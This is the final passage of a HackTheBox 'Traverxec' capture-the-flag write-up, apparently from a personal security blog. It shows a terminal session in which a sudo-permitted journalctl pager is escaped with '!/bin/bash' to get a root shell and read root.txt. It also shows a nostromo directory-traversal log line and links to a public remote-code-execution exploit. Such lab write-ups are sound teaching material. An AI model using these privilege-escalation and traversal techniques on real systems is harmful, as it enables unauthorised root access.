<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</span><br><span class="line">-- Logs begin at Fri 2020-04-10 19:50:59 EDT, end at Fri 2020-04-10 19:57:00 EDT. --</span><br><span class="line">Apr 10 19:51:03 traverxec systemd[1]: nostromo.service: Can<span class="string">&#x27;t open PID file /var/nostromo/logs/n</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec nhttpd[459]: started</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec nhttpd[459]: max. file descriptors = 1040 (cur) / 1040 (max)</span></span><br><span class="line"><span class="string">Apr 10 19:51:03 traverxec systemd[1]: Started nostromo nhttpd server.</span></span><br><span class="line"><span class="string">Apr 10 19:51:38 traverxec nhttpd[729]: /../../../../bin/sh sent a bad cgi header</span></span><br><span class="line"><span class="string">!/bin/bash</span></span><br><span class="line"><span class="string">root@traverxec:/home/david/bin# </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>get the <code>root.txt</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root@traverxec:/home/david/bin# <span class="built_in">cd</span> /root</span><br><span class="line">root@traverxec:~# <span class="built_in">ls</span></span><br><span class="line">nostromo_1.9.6-1.deb  root.txt</span><br><span class="line">root@traverxec:~# <span class="built_in">cat</span> root.txt</span><br><span class="line">9aa36[--------------------]0d906</span><br><span class="line">root@traverxec:~# </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>If you liked my writeup please leave a respect on my <a target="_blank" rel="noopener" href="https://www.hackthebox.eu/profile/128965">Profile</a></p>
<p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p>
<hr>
<p>Referrences:</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47837">nostromo 1.9.6 - Remote Code Execution</a></p>
<p><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec">Nostromo Directory Traversal Remote Command Execution</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFObins</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/journalctl/">.. &#x2F; journalctl</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Traverxec-Website"><span class="toc-number">4.1.</span> <span class="toc-text">Traverxec Website</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nostromo-1-9-6"><span class="toc-number">4.2.</span> <span class="toc-text">Nostromo 1.9.6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post - Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerate-Traverxec-machine"><span class="toc-number">5.1.</span> <span class="toc-text">Enumerate Traverxec machine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Use-Metasploit-to-Direct-Access"><span class="toc-number">5.2.</span> <span class="toc-text">Use Metasploit to Direct Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-in-into-the-machine"><span class="toc-number">5.3.</span> <span class="toc-text">Get in into the machine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WWW-DATA"><span class="toc-number">5.4.</span> <span class="toc-text">WWW-DATA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HOME-DIRECTORY"><span class="toc-number">6.1.</span> <span class="toc-text">HOME DIRECTORY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decrypt-SSH-Key-with-ssh2john"><span class="toc-number">6.2.</span> <span class="toc-text">Decrypt SSH Key with ssh2john</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-with-SSH-and-get-user-txt"><span class="toc-number">6.3.</span> <span class="toc-text">Login with SSH and get user.txt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JOURNALCTL"><span class="toc-number">7.1.</span> <span class="toc-text">JOURNALCTL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-the-ADMIN-Shell"><span class="toc-number">7.2.</span> <span class="toc-text">Get the ADMIN Shell</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&text=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&title=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&is_video=false&description=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - Traverxec üóúÔ∏èüìÇ&body=Check out this article: https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&title=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&title=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&title=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&title=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&name=HackTheBox - Traverxec üóúÔ∏èüìÇ&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-04-11/HackTheBox/PenTesting/HackTheBox-Traverxec/&t=HackTheBox - Traverxec üóúÔ∏èüìÇ"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Information Security &#64; Medz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">Tags</a></li>
        
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>

